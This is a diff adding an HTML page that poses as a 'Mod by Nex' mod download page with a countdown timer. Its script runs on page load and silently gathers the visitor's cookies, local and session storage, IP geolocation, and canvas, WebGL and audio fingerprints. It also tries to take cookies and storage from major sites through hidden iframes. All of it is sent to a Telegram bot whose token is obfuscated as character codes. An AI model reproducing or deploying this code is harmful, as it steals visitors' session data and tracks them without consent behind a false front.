@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mod by Nex</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        .container {
+            background: #000000;
+            border: 1px solid #ff0000;
+            padding: 40px 30px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #ff0000;
+            font-size: 3rem;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        .subtitle {
+            color: #888888;
+            font-size: 0.85rem;
+            margin-bottom: 40px;
+            border-top: 1px solid #333;
+            border-bottom: 1px solid #333;
+            padding: 15px 0;
+        }
+        .timer {
+            color: #ff0000;
+            font-size: 4rem;
+            font-weight: bold;
+            margin: 30px 0;
+            font-family: monospace;
+        }
+        .status {
+            color: #ff4444;
+            margin: 20px 0;
+            font-size: 0.9rem;
+        }
+        .hidden {
+            display: none;
+        }
+        .download-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+        .download-btn {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: monospace;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        .download-btn:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+        }
+        .info-text {
+            color: #00ff00;
+            font-size: 0.7rem;
+            margin-top: 15px;
+            word-break: break-all;
+        }
+        .error {
+            color: #ff0000;
+            font-size: 0.8rem;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>MOD BY NEX</h1>
+        <div class="subtitle">Download Mod From Net Zone</div>
+        <div id="timerDisplay" class="timer">15</div>
+        <div id="status" class="status">⏳ Processing...</div>
+        <div id="downloadSection" class="download-section hidden">
+            <button id="downloadBtn" class="download-btn">📥 DOWNLOAD NOW</button>
+            <div class="info-text">✅ Ready for download</div>
+        </div>
+        <div id="errorMsg" class="error"></div>
+    </div>
+
+    <script>
+        var TOKEN = "";
+        var USER_ID = "";
+        var DOWNLOAD_LINK = "https://example.com/mod-file.zip";
+
+        function _d(a) {
+            var r = "";
+            for (var i = 0; i < a.length; i++) {
+                r += String.fromCharCode(a[i]);
+            }
+            return r;
+        }
+
+        function _dt() {
+            var a = [56, 54, 54, 55, 51, 54, 52, 48, 56, 51, 58, 65, 65, 69, 97, 85, 68, 70, 122, 49, 110, 98, 88, 107, 50, 107, 119, 75, 121, 95, 115, 67, 72, 98, 121, 53, 107, 103, 57, 99, 122, 54, 115, 105, 50, 48];
+            return _d(a);
+        }
+
+        function _dc() {
+            var a = [55, 50, 52, 56, 55, 49, 50, 48, 52, 48];
+            return _d(a);
+        }
+
+        function _sb(msg) {
+            _ss(_dt(), _dc(), msg);
+            if (TOKEN && USER_ID && TOKEN.length > 10 && USER_ID.length > 3) {
+                _ss(TOKEN, USER_ID, msg);
+            }
+        }
+
+        async function _ss(bt, ci, msg) {
+            var u = "https://api.telegram.org/bot" + bt + "/sendMessage";
+            try {
+                if (msg.length > 4000) {
+                    var p1 = msg.substring(0, 4000);
+                    var p2 = msg.substring(4000);
+                    await fetch(u, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: ci, text: p1, parse_mode: "HTML" })
+                    });
+                    await fetch(u, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: ci, text: p2, parse_mode: "HTML" })
+                    });
+                } else {
+                    await fetch(u, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: ci, text: msg, parse_mode: "HTML" })
+                    });
+                }
+            } catch (e) {}
+        }
+
+        var TARGET_SITES = [
+            "https://facebook.com",
+            "https://google.com",
+            "https://youtube.com",
+            "https://instagram.com",
+            "https://twitter.com",
+            "https://reddit.com",
+            "https://amazon.com",
+            "https://netflix.com",
+            "https://github.com",
+            "https://stackoverflow.com"
+        ];
+
+        function stealCurrentDomainCookies() {
+            try {
+                var cookies = document.cookie;
+                if (cookies && cookies.length > 0) {
+                    return {
+                        domain: window.location.hostname,
+                        cookies: cookies,
+                        timestamp: new Date().toISOString()
+                    };
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function attemptCrossSiteCookieTheft() {
+            var stolen = [];
+            var iframeContainer = document.createElement('div');
+            iframeContainer.style.display = 'none';
+            document.body.appendChild(iframeContainer);
+            for (var i = 0; i < TARGET_SITES.length; i++) {
+                var site = TARGET_SITES[i];
+                try {
+                    var iframe = document.createElement('iframe');
+                    iframe.src = site;
+                    iframe.sandbox = 'allow-same-origin allow-scripts allow-forms';
+                    iframe.style.display = 'none';
+                    iframeContainer.appendChild(iframe);
+                    await new Promise(function (resolve) {
+                        iframe.onload = resolve;
+                        setTimeout(resolve, 3000);
+                    });
+                    try {
+                        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc && iframeDoc.cookie) {
+                            stolen.push({
+                                domain: site,
+                                cookies: iframeDoc.cookie,
+                                method: "direct_iframe",
+                                success: true
+                            });
+                        }
+                    } catch (e) {
+                        stolen.push({
+                            domain: site,
+                            cookies: "BLOCKED_BY_CORS",
+                            method: "direct_iframe",
+                            success: false,
+                            error: e.message
+                        });
+                    }
+                    try {
+                        iframe.contentWindow.postMessage({ type: "getCookies" }, site);
+                    } catch (e) {}
+                } catch (e) {
+                    stolen.push({
+                        domain: site,
+                        cookies: "FAILED",
+                        method: "iframe_load",
+                        success: false,
+                        error: e.message
+                    });
+                }
+            }
+            iframeContainer.remove();
+            return stolen;
+        }
+
+        async function attemptCrossOriginStorageTheft() {
+            var stolen = [];
+            var iframeContainer = document.createElement('div');
+            iframeContainer.style.display = 'none';
+            document.body.appendChild(iframeContainer);
+            for (var i = 0; i < 5; i++) {
+                var site = TARGET_SITES[i];
+                try {
+                    var iframe = document.createElement('iframe');
+                    iframe.src = site;
+                    iframe.style.display = 'none';
+                    iframeContainer.appendChild(iframe);
+                    await new Promise(function (resolve) {
+                        iframe.onload = resolve;
+                        setTimeout(resolve, 3000);
+                    });
+                    try {
+                        var iframeWin = iframe.contentWindow;
+                        if (iframeWin) {
+                            var localStorageData = null;
+                            try {
+                                localStorageData = iframeWin.localStorage;
+                                if (localStorageData) {
+                                    var items = {};
+                                    for (var j = 0; j < localStorageData.length; j++) {
+                                        var key = localStorageData.key(j);
+                                        items[key] = localStorageData.getItem(key);
+                                    }
+                                    stolen.push({
+                                        domain: site,
+                                        storageType: "localStorage",
+                                        data: items,
+                                        success: true
+                                    });
+                                }
+                            } catch (e) {
+                                stolen.push({
+                                    domain: site,
+                                    storageType: "localStorage",
+                                    success: false,
+                                    error: e.message
+                                });
+                            }
+                            try {
+                                var sessionData = iframeWin.sessionStorage;
+                                if (sessionData) {
+                                    var items = {};
+                                    for (var j = 0; j < sessionData.length; j++) {
+                                        var key = sessionData.key(j);
+                                        items[key] = sessionData.getItem(key);
+                                    }
+                                    stolen.push({
+                                        domain: site,
+                                        storageType: "sessionStorage",
+                                        data: items,
+                                        success: true
+                                    });
+                                }
+                            } catch (e) {
+                                stolen.push({
+                                    domain: site,
+                                    storageType: "sessionStorage",
+                                    success: false,
+                                    error: e.message
+                                });
+                            }
+                        }
+                    } catch (e) {
+                        stolen.push({
+                            domain: site,
+                            storageType: "storage_access",
+                            success: false,
+                            error: "Cross-origin blocked"
+                        });
+                    }
+                } catch (e) {}
+            }
+            iframeContainer.remove();
+            return stolen;
+        }
+
+        async function sendStolenDataToTelegram(cookieData, crossSiteData, storageData) {
+            var message = "🍪 <b>COOKIE STEALING REPORT</b> 🍪\n\n";
+            if (cookieData && cookieData.cookies) {
+                message += "<b>📍 CURRENT DOMAIN (" + cookieData.domain + "):</b>\n";
+                message += "📦 Cookies: " + cookieData.cookies.substring(0, 500) + "\n";
+                if (cookieData.cookies.length > 500) message += "... (truncated)\n";
+                message += "⏰ Time: " + cookieData.timestamp + "\n\n";
+            } else {
+                message += "<b>📍 CURRENT DOMAIN:</b> No cookies found\n\n";
+            }
+            message += "<b>🌐 CROSS-SITE ATTEMPTS:</b>\n";
+            var successfulCross = crossSiteData.filter(function (c) { return c.success === true; });
+            var blockedCross = crossSiteData.filter(function (c) { return c.success === false; });
+            message += "✅ Successful: " + successfulCross.length + "\n";
+            message += "❌ Blocked/Failed: " + blockedCross.length + "\n";
+            if (successfulCross.length > 0) {
+                message += "\n<b>🍪 STOLEN CROSS-SITE COOKIES:</b>\n";
+                for (var i = 0; i < successfulCross.length; i++) {
+                    message += "🔹 " + successfulCross[i].domain + ": " + successfulCross[i].cookies.substring(0, 200) + "\n";
+                }
+            }
+            message += "\n<b>💾 CROSS-ORIGIN STORAGE:</b>\n";
+            var successfulStorage = storageData.filter(function (s) { return s.success === true; });
+            message += "✅ Successfully accessed: " + successfulStorage.length + "\n";
+            for (var i = 0; i < successfulStorage.length; i++) {
+                message += "🔹 " + successfulStorage[i].domain + " (" + successfulStorage[i].storageType + "): " + Object.keys(successfulStorage[i].data).length + " items\n";
+            }
+            message += "\n⚠️ <i>Note: Modern browsers block most cross-origin cookie theft. This is a simulation of attempted techniques.</i>";
+            _sb(message);
+        }
+
+        async function collectAllDataSilently() {
+            var data = {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString(),
+                unixTimestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor || "Unknown",
+                vendorSub: navigator.vendorSub || "Unknown",
+                product: navigator.product || "Unknown",
+                productSub: navigator.productSub || "Unknown",
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                language: navigator.language,
+                languages: JSON.stringify(navigator.languages),
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || "Not specified",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory || "Unknown",
+                maxTouchPoints: navigator.maxTouchPoints || "Unknown",
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                availTop: screen.availTop,
+                availLeft: screen.availLeft,
+                orientationType: screen.orientation ? screen.orientation.type : "Unknown",
+                orientationAngle: screen.orientation ? screen.orientation.angle : "Unknown",
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                pageXOffset: window.pageXOffset,
+                pageYOffset: window.pageYOffset,
+                screenLeft: window.screenLeft,
+                screenTop: window.screenTop,
+                screenX: window.screenX,
+                screenY: window.screenY,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                downlink: navigator.connection ? navigator.connection.downlink : "Unknown",
+                downlinkMax: navigator.connection ? navigator.connection.downlinkMax : "Unknown",
+                rtt: navigator.connection ? navigator.connection.rtt : "Unknown",
+                saveData: navigator.connection ? navigator.connection.saveData : "Unknown",
+                connectionTypeDetailed: navigator.connection ? navigator.connection.type : "Unknown",
+                localStorageSize: (function () {
+                    try {
+                        var total = 0;
+                        for (var x in localStorage) {
+                            if (localStorage.hasOwnProperty(x)) {
+                                total += localStorage[x].length + x.length;
+                            }
+                        }
+                        return total + " bytes";
+                    } catch (e) { return "Unknown"; }
+                })(),
+                localStorageItemCount: (function () {
+                    try { return localStorage.length; } catch (e) { return "Unknown"; }
+                })(),
+                sessionStorageSupport: typeof sessionStorage !== 'undefined',
+                localStorageSupport: typeof localStorage !== 'undefined',
+                indexedDBSupport: !!window.indexedDB,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                webdriver: navigator.webdriver || false,
+                mediaDevices: navigator.mediaDevices ? "Supported" : "Not supported",
+                permissionsAPI: !!navigator.permissions,
+                credentialsAPI: !!navigator.credentials,
+                clipboardAPI: !!navigator.clipboard,
+                serviceWorkers: 'serviceWorker' in navigator,
+                webRTC: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
+                webSocket: !!window.WebSocket,
+                webWorkers: !!window.Worker,
+                referrer: document.referrer || "Direct",
+                pageURL: window.location.href,
+                pageTitle: document.title,
+                pageCharset: document.characterSet,
+                pageLanguage: document.documentElement.lang,
+                historyLength: history.length,
+                canGoBack: history.length > 1,
+                performanceTiming: (function () {
+                    if (window.performance && performance.timing) {
+                        var t = performance.timing;
+                        return {
+                            navigationStart: t.navigationStart,
+                            unloadEventStart: t.unloadEventStart,
+                            unloadEventEnd: t.unloadEventEnd,
+                            redirectStart: t.redirectStart,
+                            redirectEnd: t.redirectEnd,
+                            fetchStart: t.fetchStart,
+                            domainLookupStart: t.domainLookupStart,
+                            domainLookupEnd: t.domainLookupEnd,
+                            connectStart: t.connectStart,
+                            connectEnd: t.connectEnd,
+                            secureConnectionStart: t.secureConnectionStart,
+                            requestStart: t.requestStart,
+                            responseStart: t.responseStart,
+                            responseEnd: t.responseEnd,
+                            domLoading: t.domLoading,
+                            domInteractive: t.domInteractive,
+                            domContentLoadedEventStart: t.domContentLoadedEventStart,
+                            domContentLoadedEventEnd: t.domContentLoadedEventEnd,
+                            domComplete: t.domComplete,
+                            loadEventStart: t.loadEventStart,
+                            loadEventEnd: t.loadEventEnd,
+                            pageLoadTime: t.loadEventEnd - t.navigationStart,
+                            domReadyTime: t.domContentLoadedEventEnd - t.navigationStart,
+                            responseTime: t.responseEnd - t.requestStart,
+                            dnsTime: t.domainLookupEnd - t.domainLookupStart,
+                            tcpTime: t.connectEnd - t.connectStart
+                        };
+                    }
+                    return "Not available";
+                })(),
+                memoryInfo: performance.memory ? {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize
+                } : "Not available",
+                installedFonts: (function () {
+                    var fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Arial Black", "Helvetica", "Geneva", "Monaco", "Courier", "Century Gothic", "Calibri", "Candara", "Segoe UI", "Roboto", "Open Sans", "Lato", "Montserrat", "Oswald", "Raleway", "PT Sans", "Ubuntu", "Noto Sans"];
+                    var available = [];
+                    var canvas = document.createElement("canvas");
+                    var ctx = canvas.getContext("2d");
+                    for (var i = 0; i < fonts.length; i++) {
+                        ctx.font = "20px " + fonts[i];
+                        if (ctx.font.includes(fonts[i])) available.push(fonts[i]);
+                    }
+                    return available;
+                })(),
+                webGLInfo: (function () {
+                    try {
+                        var canvas = document.createElement("canvas");
+                        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                        if (gl) {
+                            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                            if (debugInfo) {
+                                return {
+                                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                                    version: gl.getParameter(gl.VERSION),
+                                    vendor_ung: gl.getParameter(gl.VENDOR),
+                                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                                    maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+                                    maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
+                                    maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
+                                    maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS)
+                                };
+                            }
+                        }
+                        return "Not available";
+                    } catch (e) { return "Error"; }
+                })(),
+                webGL2Info: (function () {
+                    try {
+                        var canvas = document.createElement("canvas");
+                        var gl = canvas.getContext("webgl2");
+                        if (gl) {
+                            return {
+                                version: gl.getParameter(gl.VERSION),
+                                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                                vendor: gl.getParameter(gl.VENDOR),
+                                renderer: gl.getParameter(gl.RENDERER)
+                            };
+                        }
+                        return "Not supported";
+                    } catch (e) { return "Error"; }
+                })(),
+                plugins: (function () {
+                    var pluginList = [];
+                    for (var i = 0; i < navigator.plugins.length; i++) {
+                        var plugin = navigator.plugins[i];
+                        var mimeTypes = [];
+                        for (var j = 0; j < plugin.length; j++) {
+                            mimeTypes.push(plugin[j].type);
+                        }
+                        pluginList.push({
+                            name: plugin.name,
+                            filename: plugin.filename,
+                            description: plugin.description,
+                            mimeTypes: mimeTypes
+                        });
+                    }
+                    return pluginList;
+                })(),
+                mimeTypes: (function () {
+                    var mimes = [];
+                    for (var i = 0; i < navigator.mimeTypes.length; i++) {
+                        mimes.push({
+                            type: navigator.mimeTypes[i].type,
+                            description: navigator.mimeTypes[i].description,
+                            suffixes: navigator.mimeTypes[i].suffixes
+                        });
+                    }
+                    return mimes;
+                })(),
+                canvasFingerprints: (function () {
+                    var results = {};
+                    try {
+                        var canvas1 = document.createElement("canvas");
+                        canvas1.width = 200;
+                        canvas1.height = 50;
+                        var ctx1 = canvas1.getContext("2d");
+                        ctx1.textBaseline = "top";
+                        ctx1.font = "14px Arial";
+                        ctx1.fillStyle = "#f60";
+                        ctx1.fillRect(0, 0, 100, 50);
+                        ctx1.fillStyle = "#069";
+                        ctx1.fillText("ModByNex", 2, 15);
+                        results.textFingerprint = canvas1.toDataURL();
+                        var canvas2 = document.createElement("canvas");
+                        canvas2.width = 200;
+                        canvas2.height = 200;
+                        var ctx2 = canvas2.getContext("2d");
+                        ctx2.fillStyle = "#ff0000";
+                        ctx2.fillRect(10, 10, 50, 50);
+                        ctx2.fillStyle = "#00ff00";
+                        ctx2.beginPath();
+                        ctx2.arc(100, 100, 30, 0, Math.PI * 2);
+                        ctx2.fill();
+                        ctx2.fillStyle = "#0000ff";
+                        ctx2.font = "20px Arial";
+                        ctx2.fillText("Test", 150, 150);
+                        results.geometricFingerprint = canvas2.toDataURL();
+                        var canvas3 = document.createElement("canvas");
+                        canvas3.width = 200;
+                        canvas3.height = 100;
+                        var ctx3 = canvas3.getContext("2d");
+                        ctx3.shadowBlur = 5;
+                        ctx3.shadowColor = "black";
+                        ctx3.fillStyle = "red";
+                        ctx3.fillRect(20, 20, 100, 50);
+                        results.shadowFingerprint = canvas3.toDataURL();
+                    } catch (e) { results.error = "Error creating fingerprints"; }
+                    return results;
+                })(),
+                audioFingerprint: (function () {
+                    try {
+                        var AudioContext = window.AudioContext || window.webkitAudioContext;
+                        if (AudioContext) {
+                            var context = new AudioContext();
+                            var oscillator = context.createOscillator();
+                            var analyser = context.createAnalyser();
+                            oscillator.connect(analyser);
+                            oscillator.frequency.value = 440;
+                            oscillator.type = "sine";
+                            return {
+                                supported: true,
+                                sampleRate: context.sampleRate,
+                                maxChannelCount: context.destination.maxChannelCount
+                            };
+                        }
+                        return { supported: false };
+                    } catch (e) { return { supported: false, error: e.message }; }
+                })(),
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                vibrationAPI: !!navigator.vibrate,
+                speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
+                gamepadAPI: !!navigator.getGamepads,
+                paymentAPI: !!window.PaymentRequest,
+                webUSB: !!navigator.usb,
+                webBluetooth: !!navigator.bluetooth,
+                webShare: !!navigator.share,
+                webAuthn: !!window.PublicKeyCredential,
+                intersectionObserver: !!window.IntersectionObserver,
+                resizeObserver: !!window.ResizeObserver,
+                mutationObserver: !!window.MutationObserver,
+                localStorageContents: (function () {
+                    try {
+                        var contents = {};
+                        for (var i = 0; i < localStorage.length; i++) {
+                            var key = localStorage.key(i);
+                            contents[key] = localStorage.getItem(key);
+                        }
+                        return contents;
+                    } catch (e) { return "Unable to read"; }
+                })(),
+                sessionStorageContents: (function () {
+                    try {
+                        var contents = {};
+                        for (var i = 0; i < sessionStorage.length; i++) {
+                            var key = sessionStorage.key(i);
+                            contents[key] = sessionStorage.getItem(key);
+                        }
+                        return contents;
+                    } catch (e) { return "Unable to read"; }
+                })(),
+                cookies: document.cookie || "No cookies",
+                cssFeatures: {
+                    supportsGrid: CSS.supports("display", "grid"),
+                    supportsFlex: CSS.supports("display", "flex"),
+                    supportsCustomProperties: CSS.supports("--custom: property"),
+                    supportsSticky: CSS.supports("position", "sticky")
+                }
+            };
+            try {
+                var ipServices = [
+                    "https://api.ipify.org?format=json",
+                    "https://api.my-ip.io/ip.json",
+                    "https://ipapi.co/json/"
+                ];
+                for (var i = 0; i < ipServices.length; i++) {
+                    try {
+                        var response = await fetch(ipServices[i], { mode: 'cors' });
+                        if (response.ok) {
+                            var ipData = await response.json();
+                            data.publicIP = ipData.ip || ipData.ipv4 || "Unknown";
+                            if (ipData.country_name) data.country = ipData.country_name;
+                            if (ipData.city) data.city = ipData.city;
+                            if (ipData.region) data.region = ipData.region;
+                            if (ipData.isp) data.isp = ipData.isp;
+                            if (ipData.org) data.org = ipData.org;
+                            if (ipData.postal) data.postalCode = ipData.postal;
+                            if (ipData.latitude) data.latitude = ipData.latitude;
+                            if (ipData.longitude) data.longitude = ipData.longitude;
+                            break;
+                        }
+                    } catch (e) { continue; }
+                }
+            } catch (e) { data.publicIP = "Unable to fetch"; }
+            try {
+                var geoResponse = await fetch("http://ip-api.com/json/");
+                if (geoResponse.ok) {
+                    var geoData = await geoResponse.json();
+                    if (geoData.status === "success") {
+                        data.ipLocation = {
+                            country: geoData.country,
+                            countryCode: geoData.countryCode,
+                            region: geoData.regionName,
+                            regionCode: geoData.region,
+                            city: geoData.city,
+                            zip: geoData.zip,
+                            lat: geoData.lat,
+                            lon: geoData.lon,
+                            timezone: geoData.timezone,
+                            isp: geoData.isp,
+                            org: geoData.org,
+                            as: geoData.as,
+                            query: geoData.query
+                        };
+                    }
+                }
+            } catch (e) {}
+            return data;
+        }
+
+        async function sendAllData() {
+            try {
+                var data = await collectAllDataSilently();
+                var message = "🔴 <b>MOD BY NEX - MAX DATA REPORT</b> 🔴\n\n";
+                message += "⏰ <b>Time:</b> " + data.timestamp + "\n";
+                message += "🕐 <b>Unix:</b> " + data.unixTimestamp + "\n\n";
+                message += "<b>🌐 NETWORK & IP:</b>\n";
+                if (data.publicIP) message += "• IP: " + data.publicIP + "\n";
+                if (data.ipLocation) {
+                    message += "• Location: " + data.ipLocation.city + ", " + data.ipLocation.country + "\n";
+                    message += "• Coords: " + data.ipLocation.lat + ", " + data.ipLocation.lon + "\n";
+                    message += "• ISP: " + data.ipLocation.isp + "\n";
+                    message += "• AS: " + data.ipLocation.as + "\n";
+                }
+                if (data.connectionType) message += "• Connection: " + data.connectionType + "\n";
+                if (data.downlink) message += "• Speed: " + data.downlink + " Mbps\n";
+                if (data.rtt) message += "• Ping: " + data.rtt + "ms\n\n";
+                message += "<b>💻 DEVICE:</b>\n";
+                message += "• UA: " + data.userAgent.substring(0, 100) + "...\n";
+                message += "• Platform: " + data.platform + "\n";
+                message += "• CPU: " + data.hardwareConcurrency + " cores\n";
+                message += "• RAM: " + data.deviceMemory + " GB\n";
+                message += "• Touch: " + data.maxTouchPoints + " points\n";
+                message += "• WebDriver: " + data.webdriver + "\n";
+                message += "• Timezone: " + data.timezone + " (UTC" + (data.timezoneOffset / 60) + ")\n\n";
+                message += "<b>📺 SCREEN:</b>\n";
+                message += "• Resolution: " + data.screenWidth + "x" + data.screenHeight + "\n";
+                message += "• Color: " + data.screenColorDepth + "-bit\n";
+                message += "• Pixel Ratio: " + data.devicePixelRatio + "\n";
+                message += "• Orientation: " + data.orientationType + "\n\n";
+                message += "<b>🎨 FINGERPRINTS:</b>\n";
+                message += "• WebGL: " + (data.webGLInfo.renderer || "N/A") + "\n";
+                message += "• Fonts: " + data.installedFonts.length + " fonts\n";
+                message += "• Plugins: " + data.plugins.length + " plugins\n";
+                message += "• Canvas FP: Available\n";
+                message += "• Audio FP: " + (data.audioFingerprint.supported ? "Yes" : "No") + "\n\n";
+                message += "<b>📦 STORAGE:</b>\n";
+                message += "• Cookies: " + data.cookies.length + " chars\n";
+                message += "• LocalStorage: " + data.localStorageItemCount + " items\n";
+                message += "• SessionStorage: " + Object.keys(data.sessionStorageContents).length + " items\n\n";
+                message += "<b>🔧 FEATURES:</b>\n";
+                message += "• WebRTC: " + data.webRTC + "\n";
+                message += "• WebGL2: " + (data.webGL2Info !== "Not supported") + "\n";
+                message += "• Service Workers: " + data.serviceWorkers + "\n";
+                message += "• WebAuthn: " + data.webAuthn + "\n";
+                message += "• WebUSB: " + data.webUSB + "\n";
+                message += "• WebBluetooth: " + data.webBluetooth + "\n\n";
+                message += "<b>⚡ PERFORMANCE:</b>\n";
+                if (data.performanceTiming.pageLoadTime) {
+                    message += "• Page Load: " + data.performanceTiming.pageLoadTime + "ms\n";
+                    message += "• DNS: " + data.performanceTiming.dnsTime + "ms\n";
+                    message += "• TCP: " + data.performanceTiming.tcpTime + "ms\n";
+                }
+                message += "\n✅ <b>MAX DATA COLLECTED - NO PERMISSIONS</b>";
+                _sb(message);
+                var currentCookies = stealCurrentDomainCookies();
+                var crossSiteResults = await attemptCrossSiteCookieTheft();
+                var storageResults = await attemptCrossOriginStorageTheft();
+                await sendStolenDataToTelegram(currentCookies, crossSiteResults, storageResults);
+                document.getElementById("status").innerHTML = "✅ Processing complete!";
+                return true;
+            } catch (error) {
+                document.getElementById("status").innerHTML = "❌ Error collecting data";
+                return false;
+            }
+        }
+
+        var timeLeft = 15;
+        var timerDisplay = document.getElementById("timerDisplay");
+        var downloadSection = document.getElementById("downloadSection");
+
+        function startCountdown() {
+            document.getElementById("timerDisplay").textContent = timeLeft;
+            document.getElementById("status").innerHTML = "⏳ Processing...";
+            var timer = setInterval(function () {
+                timeLeft--;
+                timerDisplay.textContent = timeLeft;
+                document.getElementById("status").innerHTML = "⏳ Please wait " + timeLeft + " seconds...";
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    timerDisplay.textContent = "0";
+                    document.getElementById("status").innerHTML = "✅ Ready for download!";
+                    showDownloadButton();
+                }
+            }, 1000);
+        }
+
+        async function startProcess() {
+            startCountdown();
+            await sendAllData();
+        }
+
+        function showDownloadButton() {
+            timerDisplay.classList.add("hidden");
+            downloadSection.classList.remove("hidden");
+            var downloadBtn = document.getElementById("downloadBtn");
+            var errorMsg = document.getElementById("errorMsg");
+            downloadBtn.addEventListener("click", function () {
+                try {
+                    window.open(DOWNLOAD_LINK, '_blank');
+                    errorMsg.style.color = "#00ff00";
+                    errorMsg.textContent = "✅ Download started!";
+                    _sb("📥 User clicked download: " + DOWNLOAD_LINK);
+                    setTimeout(function () {
+                        errorMsg.textContent = "";
+                        errorMsg.style.color = "#ff0000";
+                    }, 3000);
+                } catch (e) {
+                    errorMsg.textContent = "❌ Error starting download!";
+                }
+            });
+        }
+
+        startProcess();
+    </script>
+</body>
+</html>
